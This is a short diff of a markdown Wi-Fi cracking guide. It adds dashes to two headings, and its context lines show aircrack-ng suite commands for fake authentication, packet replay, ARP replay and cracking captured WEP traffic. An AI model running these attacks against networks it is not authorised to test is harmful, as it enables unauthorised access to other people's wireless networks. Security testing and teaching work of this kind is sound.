@@ -107,7 +107,7 @@ sudo airodump-ng -c <channel> --bssid <bssid of the AP> -w <output filename> wla
 ```
 aireplay-ng -1 0 -e <wifi name(ssid)> -a <bssid of the AP> -h <wireless card MAC addr> wlan0mon
 ```
-**If Fake authentication not working** 
+**---If Fake authentication not working---** 
 
 5. Interactive packet replay attack
 ```
@@ -121,7 +121,7 @@ aireplay-ng -2 -r <captured file (.cap)> wlan0mon
 ```
 aircrack-ng <captured file (.cap)>
 ```
-**If Fake authentication working** 
+**---If Fake authentication working---** 
 
 5. Do a ARP replay attack
 ```
